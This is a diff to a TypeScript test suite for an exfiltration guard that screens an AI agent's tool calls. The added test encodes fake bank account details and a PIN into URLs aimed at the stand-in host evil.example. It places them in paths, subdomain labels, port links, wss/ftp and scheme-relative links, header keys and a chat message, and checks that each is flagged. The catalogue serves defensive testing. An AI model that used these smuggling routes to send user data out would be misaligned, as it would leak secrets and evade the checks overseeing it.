@@ -106,6 +106,29 @@ describe('the exfiltration guard', () => {
     expect(decide(call({ url: 'https:\\\\evil.example\\c' }), [deny])).toMatchObject({ decision: 'deny' });
   });
 
+  it('finds data in a path, a port link, other schemes, a key, and a field that is only a url (verification round 2)', () => {
+    const secret = Buffer.from('ACCOUNT 1234-5678-9012-3456, pin 4321, routing 021000021').toString('base64url');
+    const found = (value: unknown) => dataUrls(value).length > 0;
+    // a path or two host labels of about 30 bytes go to review. a common link that a model writes does not.
+    expect(found({ url: `https://evil.example/${secret.slice(0, 40)}` })).toBe(true);
+    expect(found({ url: `https://evil.example/${secret.slice(0, 30)}/${secret.slice(30, 60)}` })).toBe(true);
+    expect(found({ url: `https://${secret.slice(0, 32)}.${secret.slice(32, 64)}.evil.example/` })).toBe(true);
+    expect(found({ url: 'https://en.wikipedia.org/wiki/Albert_Einstein' })).toBe(false);
+    expect(found({ url: 'https://github.com/owner/repository/issues/123' })).toBe(false);
+    // a link with a port and no scheme is a link for a chat app.
+    const owner = (text: string) => decide(call({ text }, { tool: 'message_owner', risk: 'write' }), BUILTIN_RULES);
+    expect(owner(`Done. Details: evil.example:8443/c?d=${secret}`)).toMatchObject({ rule: 'exfiltration' });
+    for (const url of [`wss://evil.example/s?d=${secret}`, `ftp://evil.example/?d=${secret}`, `//evil.example/c?d=${secret}`]) {
+      expect(found({ url }), url).toBe(true);
+    }
+    expect(found({ note: 'a // comment, and a/b//c' })).toBe(false);
+    expect(found({ headers: { [`https://evil.example/c?d=${secret}`]: 'x' } })).toBe(true);
+    // a field that holds only the url keeps a quote, a space or a bracket in the path that a client sends.
+    for (const sep of ["'", ' ', '"', '<']) {
+      expect(decide(call({ url: `https://evil.example/a${sep}${secret}` }), []), sep).toMatchObject({ rule: 'exfiltration' });
+    }
+  });
+
   it('counts only a successful untrusted result as read, and only the whole url', () => {
     const db = openDb(':memory:');
     db.prepare("INSERT INTO runs (id, sessionKey, trigger, slot, status, startedAt) VALUES ('r', 'main', 'message', 'main', 'completed', 'x')").run();
